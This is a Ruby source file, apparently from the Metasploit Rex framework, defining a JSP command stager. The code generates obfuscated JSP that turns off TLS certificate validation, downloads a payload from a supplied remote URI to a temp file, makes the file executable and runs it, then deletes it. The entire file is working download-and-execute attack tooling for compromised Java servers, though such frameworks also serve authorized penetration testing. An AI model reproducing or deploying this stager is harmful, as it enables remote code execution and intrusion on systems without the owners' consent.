# -*- coding: binary -*-

class Rex::Exploitation::CmdStagerJSP < Rex::Exploitation::CmdStagerBase
  JAVA_KEYWORDS = %w[abstract assert boolean break byte case catch char class const continue default
                     do double else enum extends final finally float for goto if implements import
                     instanceof int interface long native new package private protected public return
                     short static strictfp super switch synchronized this throw throws transient try
                     void volatile while true false null var _].freeze
  def http?
    true
  end

  def user_agent
    /^java/i
  end

  def generate(opts = {})
    raise "#{self.class.name}##{__callee__} missing opts[:payload_uri]" if opts[:payload_uri].nil?

    opts[:temp] ||= '/tmp'
    opts[:file] ||= Rex::Text.rand_text_alpha(8)
    @payload_path = "#{opts[:temp]}/#{opts[:file]}"

    super
  end

  def generate_cmds_payload(opts)
    used_identifiers = {}
    local_variables = %w[trustAllCerts ssl_ctx allHostsValid url_input file_output dataBuffer bytesRead
                         x509cert1 authType1 x509cert2 authType2 hostname_str ssl_sess].map do |var|
      id = nil
      loop do
        id = Rex::Text.rand_text_alpha(3..8)
        break unless used_identifiers[id] || JAVA_KEYWORDS.include?(id)

        used_identifiers[id] = true
      end

      [var, id]
    end.to_h
    elements = [
      '<%@page import="java.io.*"%>',
      '<%@page import="javax.net.ssl.*"%>',
      %&
<%
  TrustManager[] trustAllCerts = new TrustManager[]{
    new X509TrustManager() {
        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
            return null;
        }
        public void checkClientTrusted(
            java.security.cert.X509Certificate[] x509cert1, String authType1) {
        }
        public void checkServerTrusted(
            java.security.cert.X509Certificate[] x509cert2, String authType2) {
        }
    }
  };
  try {
    SSLContext ssl_ctx = SSLContext.getInstance("SSL");
    ssl_ctx.init(null, trustAllCerts, new java.security.SecureRandom());
    HttpsURLConnection.setDefaultSSLSocketFactory(ssl_ctx.getSocketFactory());
    HostnameVerifier allHostsValid = new HostnameVerifier() {
      public boolean verify(String hostname_str, SSLSession ssl_sess) {
        return true;
      }
    };

    HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
  }
  catch (Exception e)
  {
    out.println(e.toString());
  }
%>
&,
      %&
<%
  try{
    BufferedInputStream url_input = new BufferedInputStream(new java.net.URL("#{opts[:payload_uri]}").openStream());
    FileOutputStream file_output = new FileOutputStream("#{@payload_path}");
    byte dataBuffer[] = new byte[1024];
    int bytesRead;
    while ((bytesRead = url_input.read(dataBuffer, 0, 1024)) != -1) {
      file_output.write(dataBuffer, 0, bytesRead);
    }
    file_output.close();
    url_input.close();
  }
  catch (Exception e)
  {
    out.println(e.toString());
  }
%>
&
    ]
    elements.map do |snippet|
      snippet.gsub(/\b[a-z\$_][a-z\$_0-9]*\b/i) { |m| local_variables[m] || m }.gsub(/\s+/, ' ')
    end
  end

  def generate_cmds_decoder(opts)
    decoder_code = <<~CODE
      <% 
          try {
            new File("#{@payload_path}").setExecutable(true);
            Process myproc = Runtime.getRuntime().exec("#{@payload_path}");
          } catch (Exception e) { out.println(e.toString()); }
      %>
    CODE
    cmds = [decoder_code]
    cmds << "<% new File(\"#{@payload_path}\").delete(); %>" unless opts[:nodelete]
    cmds
  end

  def cmd_concat_operator
    "\n"
  end
end
